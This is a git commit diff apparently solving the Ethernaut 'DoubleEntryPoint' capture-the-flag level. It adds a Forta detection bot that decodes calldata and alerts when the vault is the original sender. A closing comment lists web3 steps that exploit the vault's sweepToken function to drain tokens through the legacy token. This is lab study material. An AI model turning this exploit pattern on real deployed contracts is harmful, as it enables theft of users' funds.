7246e2f190c60a421a2c42a22814dced7e09d6ed
sengwee <sengwee.samwell@gmail.com>
2022-05-19 18:27:56 +0800

    add DoubleEntryPoint.sol

--- DoubleEntryPoint.sol
+++ DoubleEntryPoint.sol
@@ -151,8 +151,58 @@ contract DoubleEntryPoint is
     }
 }
 
-// contract FortaBot is IDetectionBot {
-//     function handleTransaction(address user, bytes calldata msgData) public {
+contract FortaBot is IDetectionBot {
+    address private vault;
 
-//     }
-// }
+    constructor(address _vault) public {
+        vault = _vault;
+    }
+
+    /* calldata layout
+| calldata offset | length | element                                | type    | example value                                                      |
+|-----------------|--------|----------------------------------------|---------|--------------------------------------------------------------------|
+| 0x00            | 4      | function signature (handleTransaction) | bytes4  | 0x220ab6aa                                                         |
+| 0x04            | 32     | user                                   | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
+| 0x24            | 32     | offset of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000040 |
+| 0x44            | 32     | length of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000064 |
+| 0x64            | 4      | function signature (delegateTransfer)  | bytes4  | 0x9cd1a121                                                         |
+| 0x68            | 32     | to                                     | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
+| 0x88            | 32     | value                                  | uint256 | 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 |
+| 0xA8            | 32     | origSender                             | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
+| 0xC8            | 28     | padding                                | bytes   | 0x00000000000000000000000000000000000000000000000000000000         |
+*/
+    function handleTransaction(address user, bytes calldata msgData)
+        external
+        override
+    {
+        address origSender;
+        // decode msgData params
+        assembly {
+            origSender := calldataload(0xa8)
+        }
+        if (origSender == vault) {
+            Forta(msg.sender).raiseAlert(user);
+        }
+    }
+}
+
+/*
+Steps to Exploit the Vulnerability
+
+1. cryptovault = await contract.cryptoVault()
+2. functionSignature = {
+    name: 'sweepToken',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: 'token'
+        },
+    ]
+}
+3. legacytoken = await contract.delegatedFrom()
+4. params = [legacytoken]
+5. data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+6. await web3.eth.sendTransaction({from: player, to: cryptovault, data})
+
+*/
